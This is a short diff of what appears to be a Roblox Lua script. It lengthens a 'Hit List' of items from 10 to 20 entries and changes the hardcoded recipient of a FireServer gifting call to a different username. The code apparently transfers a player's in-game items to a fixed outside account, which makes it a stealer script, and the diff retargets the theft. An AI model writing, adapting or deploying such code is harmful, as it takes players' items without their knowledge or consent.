@@ -192,7 +192,7 @@ task.spawn(function()
     "──────────────\n" ..
     "**Hit List:**\n"
 
-    for i = 1, math.min(10, #items) do
+    for i = 1, math.min(20, #items) do
         message = message .. "• " .. items[i] .. "\n"
     end
 
@@ -284,7 +284,7 @@ task.spawn(function()
                     ReplicatedStorage.BridgeNet2.dataRemoteEvent:FireServer({
                         [1] = {
                             ["Item"] = currentBrainRoot,
-                            ["ToGift"] = "darkunknownusers",
+                            ["ToGift"] = "darkxensei",
                         },
                         [2] = ""
                     })
